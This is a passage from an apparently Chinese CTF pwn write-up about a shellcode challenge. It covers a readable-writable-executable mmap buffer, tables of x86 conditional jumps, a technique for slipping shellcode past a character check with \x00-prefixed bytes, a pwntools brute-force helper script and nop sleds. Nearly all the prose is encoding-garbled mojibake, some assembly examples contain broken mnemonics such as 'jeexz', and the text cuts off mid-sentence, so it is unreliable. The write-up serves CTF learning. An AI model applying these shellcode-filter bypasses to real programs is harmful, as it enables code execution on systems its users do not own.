ä½†bufç”¨mmapåˆ†é…ä¸€å—è¿ç»­çš„å†…å­˜ç©ºé—´ï¼ˆ1024ï¼‰ å…·æœ‰å¯è¯»å¯å†™å¯æ‰§è¡Œæƒé™ï¼ˆ7ï¼‰ å¯ç›´æ¥åœ¨è¿™é‡Œä¼ å…¥shellcodeæ‹¿åˆ°shell ï¼ˆbufç”¨mmapæ˜ å°„äº†åœ°å€ï¼‰</p><p>FULL RELRO<br>PIE enable</p><p>çœ‹æ±‡ç¼–ï¼ˆå¥½é•¿ä¸€ä¸²å•Š çƒ¦çƒ¦çƒ¦ é™ä¸‹å¿ƒæ…¢æ…¢çœ‹å™œ è°è®©æˆ‘è¿™ä¹ˆèœæwwï¼‰<br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807141728617.png" alt="image-20230807141728617"></p><p>è¿™å°±æ˜¯ä¸»å‡½æ•°å—ï¼<br>ğŸ€ç­ readï¼ˆ0ï¼Œbufï¼Œ0x400ï¼‰<br>ğŸŒˆæ¡† åˆ¤è¯»è¯»å…¥varé•¿åº¦ï¼Œå¦‚æœ&gt;0æ¡è·³è½¬è‡³loc_11AC,&lt;&#x3D;è·³è½¬è‡³locret_1254</p><p><strong>loc_11AC</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807142146306.png" alt="image-20230807142146306"></p><p>å°†rbp+var_4çš„ä½ç½®ç½®ä¸º0ï¼Œç„¶åè·³è½¬ç½®loc_123A</p><p><strong>loc_123A</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807142343645.png" alt="image-20230807142343645"></p><p>å¦‚æœ0&lt;è¾“å…¥å‚æ•°é•¿åº¦ï¼Œè·³è½¬è‡³loc_11B8ï¼Œå¤±è´¥åˆ™callå­—ç¬¦ä¸²åœ°å€æ‰§è¡Œï¼Œå³å†™å…¥shellcode</p><p><strong>loc_11B8</strong><br><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230807143139655.png" alt="image-20230807143139655"><br>cdqeä½¿ç”¨eaxçš„æœ€é«˜ä½æ‹“å±•raxé«˜32ä½çš„æ‰€æœ‰ä½<br>movzxæŒ‰ç…§æ— ç¬¦å·ç±»å‹ä¼ é€+æ‰©å±•ï¼ˆ16-32ï¼‰<br>eaxæ˜¯32ä½å¯„å­˜å™¨ï¼Œaxæ˜¯eaxçš„ä½16ä½ï¼Œahæ˜¯axçš„é«˜8ä½ï¼Œè€Œalæ˜¯axçš„ä½8ä½<br>ä¸Šè¿°å¤§è‡´æ„æ€æ˜¯å°†æˆ‘ä»¬è¾“å…¥å­—ç¬¦ä¸²çš„æ¯ä¸€ä½è¿›è¡Œæ¯”è¾ƒï¼Œå¦‚æœä¸åœ¨0x60-0x7AèŒƒå›´å†…å°±è·³è½¬ï¼Œloc_11DAå’Œloc_1236å°±æ˜¯èŒƒå›´ï¼ˆå‡æ˜¯&lt;&#x3D;è·³è½¬ï¼‰</p><hr><p><strong>è¡¥å……</strong></p><p>æ±‡ç¼–è¯­è¨€ä¸­æ¡ä»¶è½¬ç§»è¯­å¥ï¼šJL&#x2F;JNGEï¼Œ ç”¨äº<a href="https://baike.baidu.com/item/%E6%9C%89%E7%AC%A6%E5%8F%B7%E6%95%B0/6597563?fromModule=lemma_inlink">æœ‰ç¬¦å·æ•°</a>çš„<a href="https://baike.baidu.com/item/%E6%9D%A1%E4%BB%B6%E8%BD%AC%E7%A7%BB%E6%8C%87%E4%BB%A4/15283661?fromModule=lemma_inlink">æ¡ä»¶è½¬ç§»æŒ‡ä»¤</a>ï¼Œå°äº\ä¸å¤§äºä¸”ä¸ç­‰äºè½¬ç§»ï¼›ZF&#x3D;0ï¼Œä¸”SFâŠ•OF&#x3D;1ã€‚</p><p><a href="https://baike.baidu.com/item/%E6%B1%87%E7%BC%96%E7%A8%8B%E5%BA%8F/298210?fromModule=lemma_inlink">æ±‡ç¼–ç¨‹åº</a>è®¾è®¡ä¸­jlæ˜¯ä¸€ä¸ªæ¡ä»¶<a href="https://baike.baidu.com/item/%E8%B7%B3%E8%BD%AC%E6%8C%87%E4%BB%A4/56285320?fromModule=lemma_inlink">è·³è½¬æŒ‡ä»¤</a>ï¼Œå…¨åjump lessï¼Œæ„ä¸ºå°äºè·³è½¬ï¼Œæ•°æ¯”è¾ƒç±»ä¼¼çš„è¿˜æœ‰è¿˜æœ‰jgã€jaã€jbç­‰jg jump great æœ‰ç¬¦å·æ•°å¤§äºè·³è½¬ï¼Œ<a href="https://baike.baidu.com/item/%E6%97%A0%E7%AC%A6%E5%8F%B7%E6%95%B0/6597435?fromModule=lemma_inlink">æ— ç¬¦å·æ•°</a>æ¯”è¾ƒja above å¤§äºï¼Œjb below å°äºï¼Œæ— ç¬¦å·æ•°æ¯”è¾ƒæ¡ä»¶è·³è½¬æ ¹æ®çš„æ˜¯æ ‡å¿—ä½ï¼Œæ¡ä»¶è·³è½¬è¯­å¥å‰é¢ä¸€èˆ¬éƒ½æœ‰ä¸€äº›å¯¹æ ‡å¿—ä½æœ‰å½±å“çš„è¯­å¥ï¼Œå¦‚cmp ï¼Œ<a href="https://baike.baidu.com/item/test/10804276?fromModule=lemma_inlink">test</a> ï¼Œsubç­‰</p><p>86 æŒ‡ä»¤é›†åŒ…å«å¤§é‡çš„æ¡ä»¶è·³è½¬æŒ‡ä»¤ã€‚å®ƒä»¬èƒ½æ¯”è¾ƒæœ‰ç¬¦å·å’Œæ— ç¬¦å·æ•´æ•°ï¼Œå¹¶æ ¹æ®å•ä¸ª CPU æ ‡å¿—ä½çš„å€¼æ¥æ‰§è¡Œæ“ä½œã€‚æ¡ä»¶è·³è½¬æŒ‡ä»¤å¯ä»¥åˆ†ä¸ºå››ä¸ªç±»å‹ï¼š</p><ul><li>åŸºäºç‰¹å®šæ ‡å¿—ä½çš„å€¼è·³è½¬</li><li>åŸºäºä¸¤æ•°æ˜¯å¦ç›¸ç­‰ï¼Œæˆ–æ˜¯å¦ç­‰äºï¼ˆEï¼‰CX çš„å€¼è·³è½¬</li><li>åŸºäºæ— ç¬¦å·æ“ä½œæ•°çš„æ¯”è¾ƒè·³è½¬</li><li>åŸºäºæœ‰ç¬¦å·æ“ä½œæ•°çš„æ¯”è¾ƒè·³è½¬</li></ul><p>ä¸‹è¡¨å±•ç¤ºäº†åŸºäºé›¶æ ‡å¿—ä½ã€è¿›ä½æ ‡å¿—ä½ã€æº¢å‡ºæ ‡å¿—ä½ã€å¥‡å¶æ ‡å¿—ä½å’Œç¬¦å·æ ‡å¿—ä½çš„è·³è½¬ã€‚</p><table><thead><tr><th>åŠ©è®°ç¬¦</th><th>è¯´æ˜</th><th>æ ‡å¿—ä½&#x2F;å¯„å­˜å™¨</th><th>åŠ©è®°ç¬¦</th><th>è¯´æ˜</th><th>æ ‡å¿—ä½&#x2F;å¯„å­˜å™¨</th></tr></thead><tbody><tr><td>JZ</td><td>ä¸ºé›¶è·³è½¬</td><td>ZF&#x3D;1</td><td>JNO</td><td>æ— æº¢å‡ºè·³è½¬</td><td>OF&#x3D;0</td></tr><tr><td>JNZ</td><td>éé›¶è·³è½¬</td><td>ZF&#x3D;0</td><td>JS</td><td>æœ‰ç¬¦å·è·³è½¬</td><td>SF&#x3D;1</td></tr><tr><td>JC</td><td>è¿›ä½è·³è½¬</td><td>CF&#x3D;1</td><td>JNS</td><td>æ— ç¬¦å·è·³è½¬</td><td>SF&#x3D;0</td></tr><tr><td>JNC</td><td>æ— è¿›ä½è·³è½¬</td><td>CF&#x3D;0</td><td>JP</td><td>å¶æ ¡éªŒè·³è½¬</td><td>PF&#x3D;1</td></tr><tr><td>JO</td><td>æº¢å‡ºè·³è½¬</td><td>OF&#x3D;1</td><td>JNP</td><td>å¥‡æ ¡éªŒè·³è½¬</td><td>PF&#x3D;0</td></tr></tbody></table><h4 id="1-ç›¸ç­‰æ€§çš„æ¯”è¾ƒ"><a href="#1-ç›¸ç­‰æ€§çš„æ¯”è¾ƒ" class="headerlink" title="1) ç›¸ç­‰æ€§çš„æ¯”è¾ƒ"></a>1) ç›¸ç­‰æ€§çš„æ¯”è¾ƒ</h4><p>ä¸‹è¡¨åˆ—å‡ºäº†åŸºäºç›¸ç­‰æ€§è¯„ä¼°çš„è·³è½¬æŒ‡ä»¤ã€‚æœ‰äº›æƒ…å†µä¸‹ï¼Œè¿›è¡Œæ¯”è¾ƒçš„æ˜¯ä¸¤ä¸ªæ“ä½œæ•°ï¼›å…¶ä»–æƒ…å†µä¸‹ï¼Œåˆ™æ˜¯åŸºäº CXã€ECX æˆ– RCX çš„å€¼è¿›è¡Œè·³è½¬ã€‚è¡¨ä¸­ç¬¦å· leftOp å’Œ rightOp åˆ†åˆ«æŒ‡çš„æ˜¯ CMP æŒ‡ä»¤ä¸­çš„å·¦ï¼ˆç›®çš„ï¼‰æ“ä½œæ•°å’Œå³ï¼ˆæºï¼‰æ“ ä½œæ•°ï¼š</p><table><thead><tr><th>åŠ©è®°ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>JE</td><td>ç›¸ç­‰è·³è½¬ (leftOp&#x3D;rightOp)</td></tr><tr><td>JNE</td><td>ä¸ç›¸ç­‰è·³è½¬ (leftOp M rightOp)</td></tr><tr><td>JCXZ</td><td>CX&#x3D;0 è·³è½¬</td></tr><tr><td>JECXZ</td><td>ECX&#x3D;0 è·³è½¬</td></tr><tr><td>JRCXZ</td><td>RCX&#x3D;0 è·³è½¬ï¼ˆ64 ä½æ¨¡å¼ï¼‰</td></tr></tbody></table><p>CMP leftOp,rightOp</p><p>æ“ä½œæ•°åå­—åæ˜ äº†ä»£æ•°ä¸­å…³ç³»è¿ç®—ç¬¦çš„æ“ä½œæ•°é¡ºåºã€‚æ¯”å¦‚ï¼Œè¡¨è¾¾å¼ X&lt; Y ä¸­ï¼ŒX è¢«ç§°ä¸º leftOpï¼ŒY è¢«ç§°ä¸º rightOpã€‚</p><p>å°½ç®¡ JE æŒ‡ä»¤ç›¸å½“äº JZï¼ˆä¸ºé›¶è·³è½¬ï¼‰ï¼ŒJNE æŒ‡ä»¤ç›¸å½“äº JNZï¼ˆéé›¶è·³è½¬ï¼‰ï¼Œä½†æ˜¯ï¼Œæœ€å¥½æ˜¯é€‰æ‹©æœ€èƒ½è¡¨æ˜ç¼–ç¨‹æ„å›¾çš„åŠ©è®°ç¬¦ï¼ˆJE æˆ– JZï¼‰ï¼Œä»¥ä¾¿è¯´æ˜æ˜¯æ¯”è¾ƒä¸¤ä¸ªæ“ä½œæ•°è¿˜æ˜¯æ£€æŸ¥ç‰¹å®šçš„çŠ¶æ€æ ‡å¿—ä½ã€‚</p><p>ä¸‹è¿°ç¤ºä¾‹ä½¿ç”¨äº† JEã€JNEã€JCXZ å’Œ JECXZ æŒ‡ä»¤ã€‚ä»”ç»†é˜…è¯»æ³¨é‡Šï¼Œä»¥ä¿è¯ç†è§£ä¸ºä»€ä¹ˆæ¡ä»¶è·³è½¬å¾—ä»¥å®ç°ï¼ˆæˆ–ä¸å®ç°ï¼‰ã€‚</p><p>ç¤ºä¾‹ 1ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">edx</span>, <span class="number">0A523h</span></span><br><span class="line"><span class="keyword">cmp</span> <span class="built_in">edx</span>, <span class="number">0A523h</span></span><br><span class="line"><span class="keyword">jne</span> L5            <span class="comment">;ä¸å‘ç”Ÿè·³è½¬</span></span><br><span class="line"><span class="keyword">je</span> L1             <span class="comment">;è·³è½¬</span></span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ 2ï¼š</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="built_in">bx</span>,<span class="number">1234h</span></span><br><span class="line"><span class="keyword">sub</span> <span class="built_in">bx</span>,<span class="number">1234h</span></span><br><span class="line"><span class="keyword">jne</span> L5            <span class="comment">;ä¸å‘ç”Ÿè·³è½¬</span></span><br><span class="line"><span class="keyword">je</span> L1             <span class="comment">;è·³è½¬</span></span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ 3ï¼š</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mov</span> <span class="keyword">ex</span>, 0FFFFh</span><br><span class="line">inc <span class="keyword">ex</span></span><br><span class="line">jexz L2           ;è·³è½¬</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹4ï¼š</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">xor </span>ecx,ecx</span><br><span class="line"><span class="keyword">jeexz </span>L2          <span class="comment">;è·³è½¬</span></span><br></pre></td></tr></table></figure><h4 id="2-æ— ç¬¦å·æ•°æ¯”è¾ƒ"><a href="#2-æ— ç¬¦å·æ•°æ¯”è¾ƒ" class="headerlink" title="2) æ— ç¬¦å·æ•°æ¯”è¾ƒ"></a>2) æ— ç¬¦å·æ•°æ¯”è¾ƒ</h4><p>åŸºäºæ— ç¬¦å·æ•°æ¯”è¾ƒçš„è·³è½¬å¦‚ä¸‹è¡¨æ‰€ç¤ºã€‚æ“ä½œæ•°çš„åç§°åæ˜ äº†è¡¨è¾¾å¼ä¸­æ“ä½œæ•°çš„é¡ºåºï¼ˆæ¯”å¦‚ leftOp &lt; rightOpï¼‰ã€‚ä¸‹è¡¨ä¸­çš„è·³è½¬ä»…åœ¨æ¯”è¾ƒæ— ç¬¦å·æ•°å€¼æ—¶æ‰æœ‰æ„ä¹‰ã€‚æœ‰ç¬¦å·æ“ä½œæ•°ä½¿ç”¨ä¸åŒçš„è·³è½¬æŒ‡ä»¤ã€‚</p><table><thead><tr><th>åŠ©è®°ç¬¦</th><th>è¯´æ˜</th><th>åŠ©è®°ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>JA</td><td>å¤§äºè·³è½¬ï¼ˆè‹¥ leftOp &gt; rightOpï¼‰</td><td>JB</td><td>å°äºè·³è½¬ï¼ˆè‹¥ leftOp &lt; rightOpï¼‰</td></tr><tr><td>JNBE</td><td>ä¸å°äºæˆ–ç­‰äºè·³è½¬ï¼ˆä¸ JA ç›¸åŒï¼‰</td><td>JNAE</td><td>ä¸å¤§äºæˆ–ç­‰äºè·³è½¬ï¼ˆä¸ JB ç›¸åŒï¼‰</td></tr><tr><td>JAE</td><td>å¤§äºæˆ–ç­‰äºè·³è½¬ï¼ˆè‹¥ leftOp â‰¥ rightOpï¼‰</td><td>JBE</td><td>å°äºæˆ–ç­‰äºè·³è½¬ï¼ˆè‹¥ leftOp â‰¤ rightOpï¼‰</td></tr><tr><td>JNB</td><td>ä¸å°äºè·³è½¬ï¼ˆä¸ JAE ç›¸åŒï¼‰</td><td>JNA</td><td>ä¸å¤§äºè·³è½¬ï¼ˆä¸ JBE ç›¸åŒï¼‰</td></tr></tbody></table><h4 id="3-æœ‰ç¬¦å·æ•°æ¯”è¾ƒ"><a href="#3-æœ‰ç¬¦å·æ•°æ¯”è¾ƒ" class="headerlink" title="3) æœ‰ç¬¦å·æ•°æ¯”è¾ƒ"></a>3) æœ‰ç¬¦å·æ•°æ¯”è¾ƒ</h4><p>ä¸‹è¡¨åˆ—å²€äº†åŸºäºæœ‰ç¬¦å·æ•°æ¯”è¾ƒçš„è·³è½¬ã€‚ä¸‹é¢çš„æŒ‡ä»¤åºåˆ—å±•ç¤ºäº†ä¸¤ä¸ªæœ‰ç¬¦å·æ•°å€¼çš„æ¯”è¾ƒï¼š</p><table><thead><tr><th>åŠ©è®°ç¬¦</th><th>è¯´æ˜</th><th>åŠ©è®°ç¬¦</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>JG</td><td>å¤§äºè·³è½¬ï¼ˆè‹¥ leftOp &gt; rightOpï¼‰</td><td>JL</td><td>å°äºè·³è½¬ï¼ˆè‹¥ leftOp &lt; rightOpï¼‰</td></tr><tr><td>JNLE</td><td>ä¸å°äºæˆ–ç­‰äºè·³è½¬ï¼ˆä¸ JG ç›¸åŒï¼‰</td><td>JNGE</td><td>ä¸å¤§äºæˆ–ç­‰äºè·³è½¬ï¼ˆä¸ JL ç›¸åŒï¼‰</td></tr><tr><td>JGE</td><td>å¤§äºæˆ–ç­‰äºè·³è½¬ï¼ˆè‹¥ leftOp â‰¥ rightOpï¼‰</td><td>JLE</td><td>å°äºæˆ–ç­‰äºè·³è½¬ï¼ˆè‹¥ leftOp â‰¤ rightOpï¼‰</td></tr><tr><td>JNL</td><td>ä¸å°äºè·³è½¬ï¼ˆä¸ JGE ç›¸åŒï¼‰</td><td>JNG</td><td>ä¸å¤§äºè·³è½¬ï¼ˆä¸ JLE ç›¸åŒï¼‰</td></tr></tbody></table><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> al, +<span class="number">127</span>       ;åå…­è¿›åˆ¶æ•°å€¼ <span class="number">7</span>Fh</span><br><span class="line"><span class="attribute">cmp</span> al, -<span class="number">128</span>       ;åå…­è¿›åˆ¶æ•°å€¼ <span class="number">80</span>h</span><br><span class="line"><span class="attribute">ja</span> Is Above        ;ä¸è·³è½¬ï¼Œå› ä¸º <span class="number">7</span>Fh &lt; <span class="number">80</span>h</span><br><span class="line"><span class="attribute">jg</span> IsGreater        ;è·³è½¬ï¼Œå› ä¸º +<span class="number">127</span> &gt; -<span class="number">128</span></span><br></pre></td></tr></table></figure><p>ç”±äºæ— ç¬¦å·æ•° 7Fh å°äºæ— ç¬¦å·æ•° 80hï¼Œå› æ­¤ï¼Œä¸ºæ— ç¬¦å·æ•°æ¯”è¾ƒè€Œè®¾è®¡çš„ JA æŒ‡ä»¤ä¸å‘ç”Ÿè·³è½¬ã€‚å¦ä¸€æ–¹é¢ï¼Œç”±äº +127 å¤§äº -128ï¼Œå› æ­¤ï¼Œä¸ºæœ‰ç¬¦å·æ•°æ¯”è¾ƒè€Œè®¾è®¡çš„ JG æŒ‡ä»¤å‘ç”Ÿè·³è½¬ã€‚</p><p>å¯¹ä¸‹é¢çš„ä»£ç ç¤ºä¾‹ï¼Œé˜…è¯»æ³¨é‡Šï¼Œä»¥ä¿è¯ç†è§£ä¸ºä»€ä¹ˆè·³è½¬å¾—ä»¥å®ç°ï¼ˆæˆ–ä¸å®ç°ï¼‰ï¼š</p><p>ç¤ºä¾‹ 1ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> edx,-<span class="number">1</span></span><br><span class="line"><span class="attribute">cmp</span> edx, <span class="number">0</span></span><br><span class="line"><span class="attribute">jnl</span> L5          ;ä¸å‘ç”Ÿè·³è½¬ï¼ˆ-<span class="number">1</span> â‰¥ <span class="number">0</span> ä¸ºå‡ï¼‰</span><br><span class="line"><span class="attribute">jnle</span> L5         ;ä¸å‘ç”Ÿè·³è½¬ï¼ˆ-<span class="number">1</span> &gt; <span class="number">0</span> ä¸ºå‡ï¼‰</span><br><span class="line"><span class="attribute">jl</span> L1           ;è·³è½¬ï¼ˆ-<span class="number">1</span> &lt; <span class="number">0</span> ä¸ºçœŸï¼‰</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ 2ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> bx,+ <span class="number">32</span></span><br><span class="line"><span class="attribute">cmp</span> bx,-<span class="number">35</span></span><br><span class="line"><span class="attribute">jng</span> L5         ;ä¸å‘ç”Ÿè·³è½¬ï¼ˆ + <span class="number">32</span> â‰¤ -<span class="number">35</span> ä¸ºå‡ï¼‰</span><br><span class="line"><span class="attribute">jnge</span> L5        ;ä¸å‘ç”Ÿè·³è½¬ï¼ˆ + <span class="number">32</span> &lt; -<span class="number">35</span> ä¸ºå‡ï¼‰</span><br><span class="line"><span class="attribute">jge</span> L1         ;è·³è½¬ï¼ˆ + <span class="number">32</span> â‰¥ -<span class="number">35</span> ä¸ºçœŸï¼‰</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ 3ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">cmp</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">jg</span> L5           ;ä¸å‘ç”Ÿè·³è½¬ï¼ˆ<span class="number">0</span> &gt; <span class="number">0</span> ä¸ºå‡ï¼‰</span><br><span class="line"><span class="attribute">jnl</span> L1          ;è·³è½¬ï¼ˆ<span class="number">0</span> â‰¥ <span class="number">0</span> ä¸ºçœŸï¼‰</span><br></pre></td></tr></table></figure><p>ç¤ºä¾‹ 4ï¼š</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">mov</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">cmp</span> ecx, <span class="number">0</span></span><br><span class="line"><span class="attribute">jl</span> L5           ;ä¸å‘ç”Ÿè·³è½¬ï¼ˆ<span class="number">0</span> &lt; <span class="number">0</span> ä¸ºå‡ï¼‰</span><br><span class="line"><span class="attribute">jng</span> L1          ;è·³è½¬ï¼ˆ<span class="number">0</span> â‰¤ <span class="number">0</span> ä¸ºçœŸï¼‰</span><br></pre></td></tr></table></figure><p><strong>æˆ‘è¯´åˆæ˜¯æ–°ç›²åŒºï¼ˆæ¨‚ï¼‰</strong></p><p>NXå¼€ éƒ¨åˆ†RELRO</p><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811115741786.png" alt="image-20230811115741786"></p><p>bufæº¢å‡º</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> *<span class="title">mmap</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> length, <span class="type">int</span> prot, <span class="type">int</span> flags, <span class="type">int</span> fd, <span class="type">off_t</span> offset)</span></span>;</span><br></pre></td></tr></table></figure><ul><li><code>addr</code>ï¼šæŒ‡å®šæ˜ å°„çš„èµ·å§‹åœ°å€ï¼Œ0LL è¡¨ç¤ºè®©ç³»ç»Ÿé€‰æ‹©é€‚å½“çš„åœ°å€ã€‚</li><li><code>length</code>ï¼šæŒ‡å®šæ˜ å°„åŒºåŸŸçš„é•¿åº¦ï¼Œ4096uLL è¡¨ç¤ºæ˜ å°„åŒºåŸŸçš„å¤§å°ä¸º 4096 å­—èŠ‚ã€‚</li><li><code>prot</code>ï¼šæŒ‡å®šæ˜ å°„åŒºåŸŸçš„ä¿æŠ¤æ–¹å¼ï¼Œ7 è¡¨ç¤ºå¯è¯»ã€å¯å†™å’Œå¯æ‰§è¡Œã€‚</li><li><code>flags</code>ï¼šæŒ‡å®šæ˜ å°„åŒºåŸŸçš„æ ‡å¿—ï¼Œ34 è¡¨ç¤ºæ˜ å°„ä¸ºç§æœ‰ï¼ˆä¸ä¸å…¶ä»–è¿›ç¨‹å…±äº«ï¼‰ä¸”å»¶è¿Ÿåˆ†é…ç‰©ç†å†…å­˜ã€‚</li><li><code>fd</code>ï¼šæŒ‡å®šè¦æ˜ å°„çš„æ–‡ä»¶æè¿°ç¬¦ï¼Œ0 è¡¨ç¤ºæ²¡æœ‰å…³è”çš„æ–‡ä»¶ï¼Œä»…æ˜ å°„åŒ¿åå†…å­˜åŒºåŸŸã€‚</li><li><code>offset</code>ï¼šæŒ‡å®šæ–‡ä»¶æ˜ å°„çš„åç§»é‡ï¼Œ0LL è¡¨ç¤ºä»æ–‡ä»¶çš„èµ·å§‹ä½ç½®å¼€å§‹æ˜ å°„ã€‚</li></ul><p><img src="https://cdn.jsdelivr.net/gh/yubsec/First@main/image-20230811115837511.png" alt="image-20230811115837511"></p><p>checkï¼ˆï¼‰ å¯¹ä¼ å…¥shellcode è¿›è¡Œé€å­—ç¬¦æ£€æŸ¥  æ£€æŸ¥åˆ°*i &#x3D;&#x3D; 0æ˜¯é€€å‡º å¯ä»¥ä½¿ç”¨\x00ç»•è¿‡<br>è·Ÿè¿›unk_400F20å‘ç°æœ‰è¶³å¤Ÿç©ºé—´å†™å…¥shellcodeï¼ˆä¸é¡ºåˆ©å¯èƒ½è¿˜éœ€ç»•è¿‡ä»¥åŠshellcodeé•¿åº¦é™åˆ¶ï¼‰</p><p>\x00Båé¢åŠ ä¸Šä¸€ä¸ªå­—ç¬¦ï¼Œ å¯¹åº”ä¸€ä¸ªæ±‡ç¼–è¯­å¥.æ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡\x00B\x22ã€\x00B\x00 ã€\x00J\x00ç­‰ç­‰æ¥ç»•è¿‡æ­¤æ£€æŸ¥.</p><p>å¦ä¸€ç§å¸¸è§ç»•è¿‡æ€è·¯ï¼Œæˆ‘ä»¬ç»•è¿‡\x00å³å¯.é‚£æ€ä¹ˆç»•è¿‡å‘¢ï¼Ÿ<br>è„šæœ¬å°å­ï¼(æ‰¾æ±‡ç¼–ä¸­çš„â€™\x00â€™)<br>expï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">3</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> product([p8(k) <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>)], repeat=i):</span><br><span class="line">            payload = <span class="string">b&quot;\x00&quot;</span> + <span class="string">b&quot;&quot;</span>.join(j)</span><br><span class="line">            res = disasm(payload)</span><br><span class="line">            <span class="keyword">if</span> (</span><br><span class="line">                res != <span class="string">&quot; ...&quot;</span></span><br><span class="line">                <span class="keyword">and</span> <span class="keyword">not</span> re.search(<span class="string">r&quot;\[\w*?\]&quot;</span>, res)</span><br><span class="line">                <span class="keyword">and</span> <span class="string">&quot;.byte&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> res</span><br><span class="line">                ):</span><br><span class="line">                    <span class="built_in">print</span>(res)</span><br><span class="line">                    <span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p><strong>nop sled</strong><br>ä¸€ç§å¯ä»¥ç ´è§£æ ˆéšæœºåŒ–çš„ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ–¹å¼ã€‚ </p><p>åœ¨å®é™…çš„æ”»å‡»ä»£ç å‰æ³¨å…¥å¾ˆé•¿çš„ nop æŒ‡ä»¤ ï¼ˆæ— æ“ä½œï¼Œä»…ä½¿ç¨‹ åºè®¡æ•°å™¨åŠ ä¸€ï¼‰åºåˆ—ï¼Œ åªè¦ç¨‹åºçš„æ§åˆ¶æµæŒ‡å‘è¯¥åºåˆ—ä»»æ„ä¸€å¤„ï¼Œç¨‹åºè®¡æ•°å™¨é€æ­¥åŠ ä¸€ï¼Œç›´åˆ°åˆ°è¾¾æ”»å‡»ä»£ç çš„å­˜åœ¨çš„åœ°å€ï¼Œ å¹¶æ‰§è¡Œã€‚</p><p> ç”±äºæ ˆåœ°å€åœ¨ä¸€å®šèŒƒå›´çš„éšæœºæ€§ï¼Œæ”»å‡»è€…ä¸èƒ½å¤ŸçŸ¥é“æ”»å‡»ä»£ç æ³¨å…¥çš„åœ°å€ï¼Œè€Œè¦æ‰§è¡Œæ”»å‡»ä»£ç éœ€è¦ å°†å‡½æ•°çš„è¿”å›åœ°å€æ›´æ”¹ä¸ºæ”»å‡»ä»£ç çš„åœ°å€ï¼ˆå¯é€šè¿‡ç¼“å†²åŒºæº¢å‡ºçš„æ–¹å¼æ”¹å†™å‡½æ•°è¿”å›åœ°å€ï¼‰ã€‚æ‰€ä»¥ï¼Œåªèƒ½åœ¨ä¸€å®šèŒƒå›´å†…ï¼ˆæ ˆéšæœºå¯¼è‡´æ”»å‡»ä»£ç åœ°å€ä¸€å®šèŒƒå›´å†…éšæœºï¼‰æšä¸¾æ”»å‡»ä»£ç ä½ç½®ï¼ˆæœ‰ä¾æ®çš„çŒœï¼‰</p><figure class="highlight xl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ä¸ç”¨ <span class="function"><span class="title">nop</span> sled ï¼Œ 